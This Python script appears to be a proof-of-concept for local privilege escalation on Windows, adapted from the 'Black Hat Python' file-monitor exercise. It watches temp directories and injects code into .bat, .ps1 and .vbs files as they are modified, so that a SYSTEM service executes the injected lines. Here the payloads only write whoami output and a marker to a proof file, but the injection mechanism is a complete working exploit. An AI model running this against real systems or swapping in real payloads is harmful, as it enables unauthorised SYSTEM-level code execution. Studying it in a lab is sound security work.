import os
import tempfile
import threading
import time
import win32con
import win32file


# ---------- file event constants ----------
FILE_CREATED        = 1
FILE_DELETED        = 2
FILE_MODIFIED       = 3
FILE_RENAMED_FROM   = 4
FILE_RENAMED_TO     = 5
FILE_LIST_DIRECTORY = 0x0001

# ---------- directories to watch ----------
PATHS = ['C:\\Windows\\Temp', tempfile.gettempdir()]

# ---------- proof of concept config ----------
PROOF_FILE = 'C:\\Windows\\Temp\\bhp_proof.txt'

FILE_TYPES = {
    '.bat': [
        "\r\nREM bhpmarker\r\n",
        f'\r\ncmd.exe /c whoami /all >> {PROOF_FILE}\r\n'
    ],
    '.ps1': [
        "\r\n#bhpmarker\r\n",
        f'\r\n"whoami /all" | Out-File -Append {PROOF_FILE}\r\n'
    ],
    '.vbs': [
        "\r\n'bhpmarker\r\n",
        # Pure VBScript file write — no Shell object needed
        # If proof file appears → FileSystemObject works
        # If proof file missing → VBScript itself is sandboxed
        f'\r\nDim fso, f\r\n'
        f'Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
        f'Set f = fso.OpenTextFile("{PROOF_FILE}", 8, True)\r\n'
        f'f.WriteLine("---INJECTED CODE RAN---")\r\n'
        f'f.WriteLine(Now())\r\n'
        f'f.Close()\r\n'
    ],
}


def inject_code(full_filename, contents, extension):
    """
    Inject POC payload.
    Uses pure VBScript FileSystemObject — no Shell object.
    Proves whether our injected code actually runs as SYSTEM.
    """

    if FILE_TYPES[extension][0].strip() in contents:
        return

    print(f'[*] Injecting POC payload into {full_filename}')

    full_contents  = FILE_TYPES[extension][0]   # marker
    full_contents += FILE_TYPES[extension][1]   # poc payload
    full_contents += contents                   # original vbs

    for attempt in range(5):
        try:
            with open(full_filename, 'w') as f:
                f.write(full_contents)
            print(f'[*] \\o/ Injected — SYSTEM will write to {PROOF_FILE}')
            print(f'[*] Reading proof file in 5 seconds...')
            # Spin up thread to read proof file after SYSTEM executes
            t = threading.Thread(target=read_proof_after_delay)
            t.daemon = True
            t.start()
            return
        except PermissionError:
            print(f'[!] Permission denied — retrying ({attempt+1}/5)...')
            time.sleep(0.1)

    print('[!!!] Injection failed — file stayed locked.')


def read_proof_after_delay():
    """
    Wait for SYSTEM to execute injected VBScript
    then read and display proof file contents.
    """
    time.sleep(5)

    print('\n' + '═' * 50)
    print('[*] READING PROOF FILE:')
    print('═' * 50)

    try:
        with open(PROOF_FILE, 'r') as f:
            contents = f.read()
        print(contents)
        print('═' * 50)

        if '---INJECTED CODE RAN---' in contents:
            print('[!!!] RESULT A: FileSystemObject WORKS')
            print('[!!!] VBScript ran our code successfully')
            print('[!!!] Only WScript.Shell is blocked')
            print('[!!!] RACE CONDITION FULLY CONFIRMED')
        else:
            print('[*] File exists but content unexpected')
            print(f'[*] Contents: {contents}')

    except FileNotFoundError:
        print('[!!!] RESULT B: Proof file NOT found')
        print('[!!!] VBScript execution is sandboxed by Windows 11')
        print('[!!!] Neither FileSystemObject nor Shell object work')
        print('[!!!] This confirms Windows 11 service isolation')
        print()
        print('[*] Checking task_log to confirm service ran...')
        try:
            with open('C:\\Windows\\Temp\\task_log.txt') as f:
                last_lines = f.readlines()[-3:]
            print('[*] Last task_log entries (original VBS still ran):')
            for line in last_lines:
                print(f'    {line.strip()}')
        except Exception:
            pass

    print('═' * 50 + '\n')


def monitor(path_to_watch):
    """
    Watch directory using ReadDirectoryChangesW.
    On FILE_MODIFIED of .vbs/.bat/.ps1 → inject POC.
    """

    print(f'[*] Watching: {path_to_watch}')

    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ  |
        win32con.FILE_SHARE_WRITE |
        win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME   |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME  |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY   |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )

            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                extension     = os.path.splitext(full_filename)[1].lower()

                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')

                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')

                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')

                    if extension in FILE_TYPES:
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                            inject_code(full_filename, contents, extension)
                        except Exception as e:
                            print(f'[!!!] Failed: {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')

                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')

        except Exception:
            pass


if __name__ == '__main__':
    # Clean old proof file before starting fresh
    if os.path.exists(PROOF_FILE):
        os.remove(PROOF_FILE)
        print(f'[*] Cleared old proof file')

    for path in PATHS:
        t = threading.Thread(target=monitor, args=(path,))
        t.daemon = True
        t.start()

    print('[*] POC File monitor running. Press CTRL+C to stop.\n')

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print('\n[*] Stopping.')